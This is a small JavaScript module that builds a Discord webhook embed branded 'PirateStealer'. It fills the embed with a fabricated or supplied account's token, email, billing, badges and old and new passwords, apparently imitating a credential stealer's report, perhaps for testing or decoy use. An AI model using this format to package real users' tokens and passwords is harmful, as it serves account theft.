const generatePassword = require('password-generator');
const { generateRandomProfileWithPic, pirateStealerConfig } = require('./utils');

async function getUserPasswordChangeEmbed(account) {
    account = account || await generateRandomProfileWithPic();
    const {id, tag, nitro, injectionInfo, badges, billing, email, token, image } = account
    const oldPassword = account.password;
    const newPassword = account.password = generatePassword();
    return {
        username: "PirateStealer",
        embeds: [{
          title: "Password Changed",
          color: pirateStealerConfig["embed-color"],
          fields: [{
              name: "Info",
              value: injectionInfo,
              inline: false,
            },
            {
              name: "Username",
              value: `\`${tag}\``,
              inline: true,
            },
            {
              name: "ID",
              value: `\`${id}\``,
              inline: true,
            },
            {
              name: "Nitro",
              value: nitro,
              inline: false,
            },
            {
              name: "Badges",
              value: badges,
              inline: false,
            },
            {
              name: "Billing",
              value: billing,
              inline: false,
            },
            {
              name: "Email",
              value: `\`${email}\``,
              inline: false,
            },
            {
              name: "Old Password",
              value: `\`${oldPassword}\``,
              inline: true,
            },
            {
              name: "New Password",
              value: `\`${newPassword}\``,
              inline: true,
            },
            {
              name: "Token",
              value: `\`\`\`${token}\`\`\``,
              inline: false,
            },
          ],
          author: {
            name: "PirateStealer",
          },
          footer: {
            text: "PirateStealer",
          },
          thumbnail: {
            url: image,
          },
        }, ],
      };
}
module.exports.getUserPasswordChangeEmbed = getUserPasswordChangeEmbed;